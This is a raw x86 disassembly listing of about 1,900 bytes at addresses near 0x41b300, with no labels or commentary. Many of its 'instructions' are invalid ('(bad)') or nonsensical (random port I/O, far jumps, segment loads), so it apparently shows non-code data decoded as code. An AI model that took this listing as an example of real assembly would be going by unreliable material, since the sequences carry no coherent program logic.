  41b28d:	mov    dl,0xfb
  41b28f:	push   ecx
  41b290:	fist   WORD PTR [ebx]
  41b292:	jns    0x41b312
  41b294:	cmp    al,0xf2
  41b296:	adc    cl,BYTE PTR [ebx+0x32348232]
  41b29c:	js     0x41b2bf
  41b29e:	dec    esi
  41b29f:	xchg   edx,eax
  41b2a0:	dec    ecx
  41b2a1:	das    
  41b2a2:	inc    eax
  41b2a3:	hlt    
  41b2a4:	jnp    0x41b2de
  41b2a6:	dec    ecx
  41b2a7:	fwait
  41b2a8:	dec    ebp
  41b2a9:	pop    eax
  41b2aa:	fdiv   DWORD PTR [ebp-0x4e]
  41b2ad:	xchg   ecx,eax
  41b2ae:	ror    DWORD PTR [ebp+0x43],0x5a
  41b2b2:	cli    
  41b2b3:	test   al,0xde
  41b2b5:	jno    0x41b2fe
  41b2b7:	inc    ebx
  41b2b8:	inc    edx
  41b2b9:	call   0xfbbc:0x38270bf9
  41b2c0:	jo     0x41b292
  41b2c2:	mov    ch,0x9
  41b2c4:	cld    
  41b2c5:	rol    DWORD PTR [edx+ebx*2],cl
  41b2c8:	push   edx
  41b2c9:	push   0xb563a577
  41b2ce:	and    BYTE PTR [eax-0x21],bl
  41b2d1:	pop    esi
  41b2d2:	popf   
  41b2d3:	xlat   BYTE PTR ds:[ebx]
  41b2d5:	dec    ebp
  41b2d6:	adc    ah,BYTE PTR [ebp+0x77]
  41b2d9:	lds    edi,FWORD PTR [ecx+0x6a]
  41b2dc:	xor    ch,ch
  41b2de:	pop    edi
  41b2df:	ret    0x4652
  41b2e2:	sbb    ch,BYTE PTR [eax-0x17]
  41b2e5:	xchg   edi,eax
  41b2e6:	dec    esp
  41b2e7:	cmc    
  41b2e8:	dec    eax
  41b2e9:	jp     0x41b319
  41b2eb:	xchg   ecx,eax
  41b2ec:	xor    esp,DWORD PTR [ebx+0x3d]
  41b2ef:	cmp    BYTE PTR [eax+0x20],0xfa
  41b2f3:	clc    
  41b2f4:	push   esp
  41b2f5:	loopne 0x41b30b
  41b2f7:	pop    ebp
  41b2f8:	(bad)  
  41b2f9:	fmul   DWORD PTR [ebx]
  41b2fb:	es xchg ebx,eax
  41b2fd:	sub    eax,0x4cd74283
  41b302:	mov    BYTE PTR [ebx+0x6806cb8f],ch
  41b308:	mov    eax,0x227e8181
  41b30d:	sub    al,0xe7
  41b30f:	addr16 in eax,dx
  41b311:	pop    ds
  41b312:	add    eax,0xf87cf1f
  41b317:	mov    ds,edx
  41b319:	xor    esi,DWORD PTR [ebx+eax*4-0x7a]
  41b31d:	mov    ds:0x38d900c4,eax
  41b322:	aam    0x8
  41b324:	cli    
  41b325:	and    bl,ah
  41b327:	repz sbb al,0xec
  41b32a:	sbb    al,0x4b
  41b32c:	inc    esi
  41b32d:	inc    ebx
  41b32e:	push   ss
  41b32f:	ret    
  41b330:	jns    0x41b341
  41b332:	dec    ecx
  41b333:	jb     0x41b392
  41b335:	sub    al,0xc4
  41b337:	(bad)  
  41b338:	xor    BYTE PTR [ecx+0x53],ch
  41b33b:	or     edx,ebx
  41b33d:	stos   DWORD PTR es:[edi],eax
  41b33e:	test   BYTE PTR [edi+0x385b69f9],dl
  41b344:	(bad)  
  41b346:	inc    eax
  41b347:	call   0xc99e633a
  41b34c:	jns    0x41b2f6
  41b34e:	js     0x41b3a6
  41b350:	push   ecx
  41b351:	sub    BYTE PTR [esi],0x3f
  41b354:	add    eax,0x612f6348
  41b359:	mov    ebp,DWORD PTR ds:0x6231002d
  41b35f:	add    ah,BYTE PTR [edx-0x7c]
  41b362:	dec    ah
  41b364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b365:	cmp    eax,0xf888b58d
  41b36a:	idiv   DWORD PTR [ecx+eiz*2+0x34]
  41b36e:	aas    
  41b36f:	js     0x41b31e
  41b371:	(bad)  
  41b372:	stos   DWORD PTR es:[edi],eax
  41b373:	lock iret 
  41b375:	ss mov dl,0x53
  41b378:	xchg   ebx,eax
  41b379:	inc    esp
  41b37a:	sbb    cl,BYTE PTR [edi-0x1b]
  41b37d:	cdq    
  41b37e:	xlat   BYTE PTR ds:[ebx]
  41b37f:	push   ebp
  41b380:	idiv   DWORD PTR [eax-0x69ead3d9]
  41b386:	fmulp  st(6),st
  41b388:	cmp    eax,0x1681d660
  41b38d:	mov    BYTE PTR [ebx+eiz*1+0x4a86e0d7],ah
  41b394:	mov    dl,0xaa
  41b396:	js     0x41b3c8
  41b398:	push   ebp
  41b399:	add    DWORD PTR [edi+esi*4+0xd],edi
  41b39d:	jge    0x41b342
  41b39f:	nop
  41b3a0:	pop    esi
  41b3a1:	call   0x2c6ef3a9
  41b3a6:	and    al,0x64
  41b3a8:	test   al,0x11
  41b3aa:	cmp    BYTE PTR ds:0x1b1839f7,dl
  41b3b0:	cld    
  41b3b1:	pop    edx
  41b3b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3b3:	mov    ds:0xcb37af4f,eax
  41b3b8:	outs   dx,BYTE PTR ds:[esi]
  41b3b9:	dec    BYTE PTR [esi]
  41b3bb:	xchg   edx,eax
  41b3bc:	dec    edx
  41b3bd:	loope  0x41b36c
  41b3bf:	push   ecx
  41b3c0:	add    eax,0xdfa90926
  41b3c5:	pop    edi
  41b3c6:	or     DWORD PTR [edx-0x37eb826b],0xfffffff5
  41b3cd:	mov    BYTE PTR [ebp+0x16],ah
  41b3d0:	pop    eax
  41b3d1:	leave  
  41b3d2:	dec    ebp
  41b3d3:	push   ebp
  41b3d4:	dec    esp
  41b3d5:	ja     0x41b359
  41b3d7:	push   cs
  41b3d8:	out    dx,eax
  41b3d9:	add    dh,dh
  41b3db:	mov    ds:0x12fd9b49,al
  41b3e0:	and    DWORD PTR [eax+0x25dddaf],edi
  41b3e6:	cld    
  41b3e7:	aad    0x5f
  41b3e9:	jae    0x41b3fb
  41b3eb:	push   ebp
  41b3ec:	les    ecx,FWORD PTR [edi*2+0x1653b8fe]
  41b3f3:	mov    edx,0x3e0cd399
  41b3f8:	inc    edx
  41b3f9:	cmp    cl,BYTE PTR [esi]
  41b3fb:	mov    dl,0x62
  41b3fd:	clc    
  41b3fe:	pop    ebx
  41b3ff:	pop    edx
  41b400:	sub    al,0x2b
  41b402:	pop    esi
  41b403:	or     eax,0xb75f8807
  41b408:	sub    DWORD PTR [eax-0x17],edi
  41b40b:	xchg   esp,eax
  41b40c:	jmp    0xbe811be5
  41b411:	(bad)  
  41b412:	xchg   ebx,eax
  41b413:	stos   BYTE PTR es:[edi],al
  41b414:	mov    edi,DWORD PTR [ebx-0x3deaf4f2]
  41b41a:	ficom  WORD PTR [ebx+0x53a55e02]
  41b420:	mov    ch,0x65
  41b422:	ret    
  41b423:	fwait
  41b424:	cmp    dh,BYTE PTR [ebx+ebx*2]
  41b427:	and    BYTE PTR ds:0xd30dceee,bl
  41b42d:	xor    ah,bh
  41b42f:	inc    edi
  41b430:	lea    edi,[edx+0x6904804b]
  41b436:	enter  0xc041,0xa6
  41b43a:	cmp    eax,0xf5a944d7
  41b43f:	outs   dx,BYTE PTR ds:[esi]
  41b440:	sub    DWORD PTR [edx+0x2d],ecx
  41b443:	loope  0x41b456
  41b445:	add    ah,BYTE PTR [ecx+0x20]
  41b448:	jnp    0x41b484
  41b44a:	stc    
  41b44b:	and    ecx,esi
  41b44d:	les    ecx,FWORD PTR [edx+0x4a]
  41b450:	add    esi,DWORD PTR [eax+0x286193ed]
  41b456:	outs   dx,DWORD PTR ds:[esi]
  41b457:	and    eax,0xde6bfd4c
  41b45c:	xchg   BYTE PTR [ebx],dl
  41b45e:	test   ebp,ebp
  41b460:	xchg   edi,eax
  41b461:	mov    dl,0xb8
  41b463:	jmp    0x41b4ac
  41b465:	arpl   WORD PTR [ebp-0x7],dx
  41b468:	push   esp
  41b469:	jns    0x41b483
  41b46b:	shr    BYTE PTR [edi-0x16],0x24
  41b46f:	cdq    
  41b470:	(bad)  
  41b471:	lods   al,BYTE PTR ds:[esi]
  41b472:	jns    0x41b4ea
  41b474:	mov    BYTE PTR [eax],dl
  41b476:	pop    edx
  41b477:	inc    esp
  41b478:	xlat   BYTE PTR ds:[ebx]
  41b479:	jmp    0xc8ff6612
  41b47e:	pusha  
  41b47f:	inc    eax
  41b480:	mov    dh,0x3d
  41b482:	sub    al,0x2b
  41b484:	sti    
  41b485:	out    0x31,eax
  41b487:	adc    BYTE PTR [ebx],bl
  41b489:	add    cl,al
  41b48b:	shr    DWORD PTR [eax+eax*8-0x678b59d8],cl
  41b492:	mov    edx,DWORD PTR [ebx]
  41b494:	std    
  41b495:	jle    0x41b466
  41b497:	add    ecx,ebx
  41b499:	dec    esp
  41b49a:	stc    
  41b49b:	das    
  41b49c:	test   eax,0x8be701f7
  41b4a1:	cs xchg esp,eax
  41b4a3:	pop    ss
  41b4a4:	mov    dh,0x4b
  41b4a6:	outs   dx,BYTE PTR ds:[esi]
  41b4a7:	cmp    al,0x1b
  41b4a9:	xlat   BYTE PTR ds:[ebx]
  41b4aa:	pop    ecx
  41b4ab:	sub    ax,0xfe8c
  41b4af:	jmp    0x662bc30d
  41b4b4:	(bad)  
  41b4b5:	fdiv   QWORD PTR [ebx+0x1d]
  41b4b8:	in     eax,0x6d
  41b4ba:	call   0x24f0c2c3
  41b4bf:	sar    DWORD PTR [ebp+0x4d],0x3a
  41b4c3:	sbb    eax,0xeb1f7a51
  41b4c8:	jl     0x41b4fb
  41b4ca:	adc    ecx,ecx
  41b4cc:	inc    ebx
  41b4cd:	adc    BYTE PTR [esi+0x52b3a070],0x1e
  41b4d4:	mov    ch,0xdb
  41b4d6:	ja     0x41b490
  41b4d8:	mov    al,0xa5
  41b4da:	sahf   
  41b4db:	mov    dl,0x13
  41b4dd:	adc    BYTE PTR [esi-0x5572c20b],ah
  41b4e3:	mov    DWORD PTR [ebx+0x6b],edi
  41b4e6:	cdq    
  41b4e7:	scas   eax,DWORD PTR es:[edi]
  41b4e8:	or     al,0xc2
  41b4ea:	pop    ebp
  41b4eb:	jmp    0x9478:0xc670a9e5
  41b4f2:	call   0xeb9:0xf4cfdbcd
  41b4f9:	test   BYTE PTR [edi],dl
  41b4fb:	popw   es
  41b4fd:	(bad)  
  41b4fe:	aaa    
  41b4ff:	inc    cx
  41b501:	mov    ebx,0x5fe71ac9
  41b506:	dec    eax
  41b507:	lock mov ebx,0x94582856
  41b50d:	int    0x7d
  41b50f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b510:	mov    eax,ds:0xf1001d45
  41b515:	in     al,dx
  41b516:	lods   eax,DWORD PTR ds:[esi]
  41b517:	push   esp
  41b518:	adc    cl,BYTE PTR [ecx+0x7c4b4e83]
  41b51e:	add    DWORD PTR ds:0x40ba1968,ecx
  41b524:	lahf   
  41b525:	je     0x41b4cf
  41b527:	pusha  
  41b528:	rcl    DWORD PTR gs:[ebp-0x536b149a],0x9b
  41b530:	pop    ecx
  41b531:	mov    edx,0x5704d115
  41b536:	es pop ds
  41b538:	add    esi,0x325f4903
  41b53e:	add    eax,0xe28f1d9d
  41b543:	add    bl,bh
  41b545:	pop    es
  41b546:	push   ds
  41b547:	jo     0x41b5b2
  41b549:	xchg   esi,eax
  41b54a:	pop    ds
  41b54b:	loop   0x41b527
  41b54d:	push   ds
  41b54e:	(bad)  
  41b54f:	pushf  
  41b550:	mov    al,ds:0x35755384
  41b555:	add    BYTE PTR [eax-0x6c83b064],ah
  41b55b:	shl    DWORD PTR [edi+0x40f9033b],1
  41b561:	push   edi
  41b562:	sbb    dh,BYTE PTR [eax]
  41b564:	int    0xbd
  41b566:	pop    ebp
  41b567:	xchg   esi,eax
  41b568:	jbe    0x41b5e4
  41b56a:	clc    
  41b56b:	mov    eax,0x71b738fe
  41b570:	imul   esi,DWORD PTR [edx+eiz*4-0x5e32a295],0x17e5bcad
  41b57b:	iret   
  41b57c:	or     cl,BYTE PTR [edx-0x77]
  41b57f:	push   es
  41b580:	cdq    
  41b581:	xchg   BYTE PTR [ebx],dh
  41b583:	addr16 cmp al,0xb1
  41b586:	dec    edi
  41b587:	fwait
  41b588:	xchg   ebx,eax
  41b589:	out    dx,eax
  41b58a:	dec    ebp
  41b58b:	pop    es
  41b58c:	js     0x41b602
  41b58e:	mov    ds:0xc64c6804,al
  41b593:	adc    esp,0xffffffbe
  41b596:	mov    ch,0x38
  41b598:	xor    eax,0xc8c13a23
  41b59d:	fcomp  DWORD PTR [esi-0x3479dd4c]
  41b5a3:	pop    esp
  41b5a4:	push   ebx
  41b5a5:	mov    eax,ds:0x472c3bf6
  41b5aa:	ss jne 0x41b5e7
  41b5ad:	push   0x14
  41b5af:	enter  0x69a2,0xd6
  41b5b3:	dec    ebx
  41b5b4:	mov    ds:0xe391ac77,al
  41b5b9:	mov    dh,0x2
  41b5bb:	lds    edx,FWORD PTR [edi+0xa54f68e]
  41b5c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5c2:	mov    eax,ds:0x955c7f6d
  41b5c7:	gs xlat BYTE PTR ds:[ebx]
  41b5ca:	dec    esi
  41b5cb:	push   edx
  41b5cc:	inc    edx
  41b5cd:	jnp    0x41b613
  41b5cf:	shr    DWORD PTR [ebp+ebx*1+0x5fb72f9a],0x9a
  41b5d7:	push   ecx
  41b5d8:	jp     0x41b655
  41b5da:	fucomp st(7)
  41b5dc:	pop    ss
  41b5dd:	sub    BYTE PTR [eax],0x75
  41b5e0:	adc    al,0x5d
  41b5e2:	jle    0x41b59a
  41b5e4:	and    al,0xc9
  41b5e6:	fcmovnb st,st(0)
  41b5e8:	and    dl,BYTE PTR ds:0x188fcf8c
  41b5ee:	lock push ds
  41b5f0:	mov    ss,WORD PTR [edx+edi*4]
  41b5f3:	xor    eax,0xe9f7a9f8
  41b5f8:	imul   BYTE PTR [eax-0x59]
  41b5fb:	rol    BYTE PTR [esi+0x7cd035a7],0xbd
  41b602:	shl    BYTE PTR [edi+0x2d],cl
  41b605:	ds mov al,0x31
  41b608:	lea    ebx,[edx-0x7e2afa46]
  41b60e:	xor    cl,dh
  41b610:	push   edi
  41b611:	mov    al,ds:0xc0fea079
  41b616:	data16 out 0x84,al
  41b619:	imul   edx,eax,0xffffffba
  41b61c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b61d:	js     0x41b621
  41b61f:	and    BYTE PTR [edi+0x46],al
  41b622:	adc    DWORD PTR [edi+0x31837c19],esi
  41b628:	mov    ah,0x7c
  41b62a:	sub    BYTE PTR [edi+0x27],0x41
  41b62e:	iret   
  41b62f:	mov    esp,0x4b21e6f1
  41b634:	fidivr WORD PTR [edx+edx*1+0x27]
  41b638:	shl    BYTE PTR ss:[eax+0x1b],cl
  41b63c:	lods   eax,DWORD PTR ds:[esi]
  41b63d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b63e:	jmp    0xb2b:0x99ab1f5
  41b645:	ins    BYTE PTR es:[edi],dx
  41b646:	bound  esp,QWORD PTR [ebx-0x7e007733]
  41b64c:	xchg   esi,eax
  41b64d:	(bad)  [ecx]
  41b64f:	xor    eax,0x24c13ce9
  41b654:	ds jle 0x41b62a
  41b657:	cwde   
  41b658:	jmp    0xac78:0xbd4b1311
  41b65f:	jmp    0x41b645
  41b661:	sbb    eax,0xd0e82b09
  41b666:	pop    eax
  41b667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b668:	imul   edi,DWORD PTR [edx+0x7547cb78],0x69
  41b66f:	ja     0x41b604
  41b671:	and    al,0x78
  41b673:	xchg   DWORD PTR [ebp+0x52],ecx
  41b676:	inc    ebp
  41b677:	pop    edi
  41b678:	sahf   
  41b679:	xchg   esp,eax
  41b67a:	push   ebx
  41b67b:	popa   
  41b67c:	xchg   ebx,eax
  41b67d:	pop    ss
  41b67e:	loope  0x41b6c1
  41b680:	lea    esp,ds:0x7244e212
  41b686:	push   0xffffffa6
  41b688:	or     edi,DWORD PTR [ebx-0x12dc417d]
  41b68e:	ficom  DWORD PTR [edi-0x32]
  41b691:	(bad)  
  41b692:	pusha  
  41b693:	in     eax,dx
  41b694:	push   esp
  41b695:	(bad)  
  41b696:	int    0xc6
  41b698:	xchg   esi,eax
  41b699:	outs   dx,BYTE PTR ds:[esi]
  41b69a:	outs   dx,DWORD PTR ds:[esi]
  41b69b:	jmp    0x41b693
  41b69d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b69e:	add    DWORD PTR [edx],ebp
  41b6a0:	mov    ds:0x2d2c5627,al
  41b6a5:	push   ss
  41b6a6:	mov    ?,esp
  41b6a8:	sbb    bl,BYTE PTR [edx-0x496d4e43]
  41b6ae:	or     BYTE PTR [esp+ebp*2],0xaa
  41b6b2:	shl    BYTE PTR [esi-0x6c],0x15
  41b6b6:	pop    ecx
  41b6b7:	xchg   DWORD PTR [eax+esi*4-0x665644c4],ebp
  41b6be:	nop
  41b6bf:	(bad)  
  41b6c0:	jmp    0xb1f5:0xabcbafae
  41b6c7:	js     0x41b68e
  41b6c9:	rcl    BYTE PTR [ebx-0x716fe2d8],0x25
  41b6d0:	adc    eax,0xd1c0c895
  41b6d5:	call   0x53e8:0xe2a4b4d9
  41b6dc:	fist   DWORD PTR [ebp+0x32]
  41b6df:	mov    al,ds:0x907b226e
  41b6e4:	imul   ecx,DWORD PTR [edx+edi*1-0x769c2ee],0x38c703e2
  41b6ef:	iret   
  41b6f0:	dec    ebp
  41b6f1:	mov    gs,WORD PTR [ebx+0x5b]
  41b6f4:	mov    WORD PTR [ecx+ebx*1],es
  41b6f7:	mov    eax,ds:0x9dbc4b66
  41b6fc:	adc    BYTE PTR [ecx],ah
  41b6fe:	push   0xe5c8ffa1
  41b703:	add    esp,DWORD PTR [edi]
  41b705:	imul   ebx,esp,0xbe8d436
  41b70b:	xor    ah,cl
  41b70d:	mov    ebx,0x1fcc0b8e
  41b712:	xchg   esi,eax
  41b713:	(bad)  
  41b714:	out    dx,eax
  41b715:	lahf   
  41b716:	sbb    BYTE PTR [esi],dh
  41b718:	add    eax,0xf1c294dd
  41b71d:	out    0x6e,al
  41b71f:	cmp    BYTE PTR [ebp-0x66],bl
  41b722:	or     BYTE PTR [esp+edx*1],bl
  41b725:	mov    al,ds:0x3b05d77c
  41b72a:	outs   dx,DWORD PTR ds:[esi]
  41b72b:	mov    edx,0x3386525d
  41b730:	out    dx,eax
  41b731:	ret    
  41b732:	jmp    0x89e5:0x9bf3dd49
  41b739:	cmp    al,0x19
  41b73b:	add    edx,DWORD PTR [edx+0x42]
  41b73e:	cmp    bl,dl
  41b740:	add    edx,DWORD PTR [ecx-0x71cecd71]
  41b746:	in     al,dx
  41b747:	mov    BYTE PTR [edx-0x3276c3e5],al
  41b74d:	jg     0x41b758
  41b74f:	or     ch,al
  41b751:	gs jbe 0x41b734
  41b754:	test   BYTE PTR es:[edi+0x1967f789],dh
  41b75b:	jnp    0x41b709
  41b75d:	or     eax,ebx
  41b75f:	cmp    eax,0x7aff55c9
  41b764:	xor    eax,0x6a88e6cf
  41b769:	jno    0x41b721
  41b76b:	lock (bad) 
  41b76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b76e:	push   0xdd98d54
  41b773:	cmp    edx,DWORD PTR [esi-0x25]
  41b776:	les    sp,DWORD PTR [ebx+0x6ada6fc2]
  41b77d:	and    DWORD PTR [ecx],ebx
  41b77f:	jbe    0x41b777
  41b781:	push   ecx
  41b782:	cmp    al,0x49
  41b784:	inc    esi
  41b785:	out    dx,al
  41b786:	pop    ebx
  41b787:	ror    DWORD PTR [ecx-0x6b783e9a],0x6b
  41b78e:	mov    ss,WORD PTR [ecx+0x787d6870]
  41b794:	cmp    ecx,edi
  41b796:	dec    eax
  41b797:	jmp    0xa2ebdb05
  41b79c:	xor    BYTE PTR [ebx],dl
  41b79e:	inc    edi
  41b79f:	in     eax,dx
  41b7a0:	sub    edi,edi
  41b7a2:	in     eax,dx
  41b7a3:	cmp    ah,BYTE PTR ss:[ebp+eiz*1-0x1a]
  41b7a8:	xor    ebx,esi
  41b7aa:	mov    ch,0xad
  41b7ac:	mov    ds:0x73abf425,eax
  41b7b1:	in     eax,0x6b
  41b7b3:	enter  0x6963,0x10
  41b7b7:	retf   
  41b7b8:	mul    ch
  41b7ba:	sbb    DWORD PTR [edx+0x7b],ecx
  41b7bd:	pop    ss
  41b7be:	mov    esp,0x380f96de
  41b7c3:	call   0x43ea1d51
  41b7c8:	push   ebx
  41b7c9:	inc    eax
  41b7ca:	shl    DWORD PTR [ecx-0x7e],1
  41b7cd:	hlt    
  41b7ce:	repnz in al,0xaa
  41b7d1:	cld    
  41b7d2:	or     dh,BYTE PTR [edi+0x59]
  41b7d5:	stc    
  41b7d6:	sbb    ah,BYTE PTR [edi]
  41b7d8:	sub    ebx,ebx
  41b7da:	stc    
  41b7db:	mov    DWORD PTR [esi+0x507f91a7],esi
  41b7e1:	popf   
  41b7e2:	mov    bl,0x22
  41b7e4:	enter  0x51ef,0x94
  41b7e8:	push   eax
  41b7e9:	xchg   DWORD PTR [edi],eax
  41b7eb:	jno    0x41b858
  41b7ed:	jle    0x41b817
  41b7ef:	out    0x56,al
  41b7f1:	fidiv  DWORD PTR [eax]
  41b7f3:	div    BYTE PTR [ebx+edi*8+0x3a7b3ccf]
  41b7fa:	and    BYTE PTR [esi],bl
  41b7fc:	shl    DWORD PTR [ebx+0x7b],0x8a
  41b800:	jne    0x41b7ee
  41b802:	or     eax,0x804e8f76
  41b807:	retf   0x3b5
  41b80a:	xchg   edi,eax
  41b80b:	pop    ss
  41b80c:	int    0xb2
  41b80e:	cwde   
  41b80f:	test   al,bh
  41b811:	mov    ch,bh
  41b813:	(bad)  
  41b814:	mov    al,0x92
  41b816:	dec    esp
  41b817:	ss leave 
  41b819:	popf   
  41b81a:	dec    esi
  41b81b:	or     DWORD PTR [ebx-0xc6ca13b],esp
  41b821:	inc    ebx
  41b822:	adc    DWORD PTR ds:0x3bc3b776,0x9
  41b829:	test   eax,0xfdc78176
  41b82e:	je     0x41b80f
  41b830:	xor    eax,0x891700e9
  41b835:	mov    DWORD PTR [ebx-0x31],esi
  41b838:	and    BYTE PTR [ebp+0x16cea6ca],dl
  41b83e:	xchg   esp,eax
  41b83f:	imul   ebx,DWORD PTR [ecx],0xffffff96
  41b842:	pop    edx
  41b843:	sbb    BYTE PTR [eax],bl
  41b845:	or     BYTE PTR ds:0x9ef21ecd,bl
  41b84b:	mov    ds:0xc8b7852e,eax
  41b850:	pop    edx
  41b851:	lds    ebx,FWORD PTR [ecx+0x37]
  41b854:	pop    edi
  41b855:	ins    BYTE PTR es:[edi],dx
  41b856:	mov    WORD PTR [ebx],cs
  41b858:	sbb    al,0x8c
  41b85b:	pop    ecx
  41b85c:	fstp   DWORD PTR [eax]
  41b85e:	mov    DWORD PTR [esi],ebp
  41b860:	pusha  
  41b861:	pop    ebx
  41b862:	push   0xffffffde
  41b864:	shl    edx,cl
  41b866:	push   cs
  41b867:	jmp    0x12c2db3a
  41b86c:	xor    DWORD PTR ss:[ebx-0xb],eax
  41b870:	sub    BYTE PTR [edi],0xb7
  41b873:	adc    DWORD PTR [esi+0x74],eax
  41b876:	(bad)  
  41b877:	adc    BYTE PTR [edi],dh
  41b879:	add    al,BYTE PTR [edx+0x3e]
  41b87c:	fisubr WORD PTR [edx]
  41b87e:	push   0x31eebb3c
  41b883:	sub    DWORD PTR [edi],edi
  41b885:	sub    eax,0xf4cbb825
  41b88a:	ficom  WORD PTR [ecx+0x12]
  41b88d:	sahf   
  41b88e:	ja     0x41b8f4
  41b890:	mov    bl,0xb9
  41b892:	sbb    al,0xc8
  41b894:	call   0xb1d22e4d
  41b899:	lds    edx,FWORD PTR [ecx]
  41b89b:	cmp    BYTE PTR [edi+esi*8],0xec
  41b89f:	push   ebp
  41b8a0:	ror    BYTE PTR [ebp+0x5e],0x86
  41b8a4:	ins    BYTE PTR es:[edi],dx
  41b8a5:	pop    edx
  41b8a6:	jno    0x41b8c4
  41b8a8:	sbb    al,0x75
  41b8aa:	adc    ebx,esi
  41b8ac:	test   eax,0xc33d9d4a
  41b8b1:	xor    ah,BYTE PTR [edi+0x19b6d295]
  41b8b7:	mov    BYTE PTR [esp+edx*4],dh
  41b8ba:	push   ebx
  41b8bb:	ja     0x41b87e
  41b8bd:	cdq    
  41b8be:	mov    BYTE PTR [edx],dh
  41b8c0:	jl     0x41b8c8
  41b8c2:	int    0xd9
  41b8c4:	push   ecx
  41b8c5:	cmp    dh,ah
  41b8c7:	jl     0x41b884
  41b8c9:	sbb    eax,0x3cdb22d2
  41b8ce:	rol    BYTE PTR [ecx],cl
  41b8d0:	sub    bl,BYTE PTR [ebx-0x19d3787d]
  41b8d6:	adc    DWORD PTR [ebp+eiz*1+0x2682726f],ecx
  41b8dd:	out    dx,al
  41b8de:	das    
  41b8df:	out    0x2b,eax
  41b8e1:	ret    
  41b8e2:	jns    0x41b914
  41b8e4:	bound  edx,QWORD PTR [esi]
  41b8e6:	jp     0x41b910
  41b8e8:	inc    esp
  41b8e9:	scas   eax,DWORD PTR es:[edi]
  41b8ea:	fdiv   DWORD PTR [edi]
  41b8ec:	mov    ch,0xef
  41b8ee:	bound  esp,QWORD PTR [ecx]
  41b8f0:	pop    esp
  41b8f1:	mov    bl,0x7c
  41b8f3:	jnp    0x41b93a
  41b8f5:	push   edx
  41b8f6:	inc    ecx
  41b8f7:	pop    ebx
  41b8f8:	ins    BYTE PTR es:[edi],dx
  41b8f9:	pop    edx
  41b8fa:	test   DWORD PTR [edx-0x4d5e0c10],edi
  41b900:	mov    ds:0x85e3ee04,al
  41b905:	inc    edi
  41b906:	pop    ebp
  41b907:	push   esi
  41b908:	xchg   edi,eax
  41b909:	stos   DWORD PTR es:[edi],eax
  41b90a:	pop    eax
  41b90b:	cmp    ecx,DWORD PTR [esi-0x4]
  41b90e:	xlat   BYTE PTR ds:[ebx]
  41b90f:	cmp    BYTE PTR [ebx+0x7e18a3f9],al
  41b915:	and    al,0x42
  41b917:	shl    ch,1
  41b919:	sahf   
  41b91a:	pushf  
  41b91b:	xor    bl,BYTE PTR [ecx-0x40497cf7]
  41b921:	xchg   ecx,eax
  41b922:	push   ecx
  41b923:	lds    ebp,FWORD PTR [edi-0x21fc5b9]
  41b929:	rcl    dl,1
  41b92b:	add    DWORD PTR [esi+edi*1],eax
  41b92e:	cli    
  41b92f:	test   DWORD PTR [edi],ecx
  41b931:	ins    BYTE PTR es:[edi],dx
  41b932:	adc    al,0xc5
  41b934:	(bad)  
  41b935:	cli    
  41b936:	fisttp DWORD PTR [eax+edx*1]
  41b939:	test   eax,0x9d2c2136
  41b93e:	pop    es
  41b93f:	shr    DWORD PTR [esi-0x303c5294],cl
  41b945:	pushf  
  41b946:	push   ds
  41b947:	outs   dx,BYTE PTR ds:[esi]
  41b948:	fs jle 0x41b96d
  41b94b:	inc    ecx
  41b94c:	push   edx
  41b94d:	mov    al,ds:0x9d19bca1
  41b952:	xchg   edi,eax
  41b953:	fldlg2 
  41b955:	pop    esi
  41b956:	xor    DWORD PTR [ecx-0x7e94d2e0],esi
  41b95c:	loopne 0x41b9db
  41b95e:	push   cs
  41b95f:	add    BYTE PTR [eax-0x7e],0xa0
  41b963:	es inc ecx
  41b965:	ret    0x1c72
  41b968:	xchg   esp,eax
  41b969:	or     ecx,ecx
  41b96b:	sti    
  41b96c:	inc    eax
  41b96d:	xchg   DWORD PTR [ebp+0x41],ecx
  41b970:	mov    eax,ds:0xa53f0c9c
  41b975:	pop    ds
  41b976:	retf   
  41b977:	pop    ebp
  41b978:	sub    eax,DWORD PTR [eax-0x2bf9a97b]
  41b97e:	dec    edi
  41b97f:	pop    ebx
  41b980:	aas    
  41b981:	mov    DWORD PTR [edi-0x4c],edi
  41b984:	xchg   BYTE PTR [esi-0xa],bh
  41b987:	mov    ch,0x22
  41b989:	and    BYTE PTR [eax-0x2973e085],0x72
  41b990:	hlt    
  41b991:	cmp    eax,0xd42168b
  41b996:	add    DWORD PTR [ebp-0x65],edx
  41b999:	test   DWORD PTR [edi+eiz*8-0x67],edx
  41b99d:	pusha  
  41b99e:	in     al,0x5b
  41b9a0:	or     eax,0xfeffe46b
  41b9a5:	inc    edx
  41b9a6:	js     0x41ba0b
  41b9a8:	retf   
  41b9a9:	cdq    
  41b9aa:	std    
  41b9ab:	idiv   DWORD PTR ds:0x1bcf86be
  41b9b1:	mov    ecx,0x43b982a2
  41b9b6:	cwde   
  41b9b7:	fst    DWORD PTR [esi-0x7f33bf9a]
  41b9bd:	fiadd  WORD PTR [ecx-0x49]
  41b9c0:	scas   al,BYTE PTR es:[edi]
  41b9c1:	mov    ah,dh
  41b9c3:	sbb    esi,DWORD PTR [ebp+edi*1-0x4b]
  41b9c7:	sub    BYTE PTR [esi-0x11],al
  41b9ca:	mov    ah,0x5a
  41b9cc:	pop    ecx
  41b9cd:	xchg   al,dl
  41b9cf:	jecxz  0x41ba1d
  41b9d1:	in     eax,dx
  41b9d2:	mov    edx,0x7e5ee74e
  41b9d7:	(bad)  
  41b9d8:	(bad)  
  41b9d9:	jecxz  0x41b960
  41b9db:	cld    
  41b9dc:	jg     0x41ba11
  41b9de:	or     ebx,esi
  41b9e0:	adc    eax,0x7d607785
  41b9e5:	pop    ecx
  41b9e6:	outs   dx,BYTE PTR ds:[esi]
  41b9e7:	in     al,dx
  41b9e8:	ins    BYTE PTR es:[edi],dx
  41b9e9:	mov    edi,0x635f4b67
  41b9ee:	loope  0x41b9f2
  41b9f0:	xchg   edx,eax
  41b9f1:	cmp    ah,bh
  41b9f3:	inc    eax
  41b9f4:	test   eax,0xf0aaf841
  41b9f9:	out    dx,eax
  41b9fa:	inc    eax
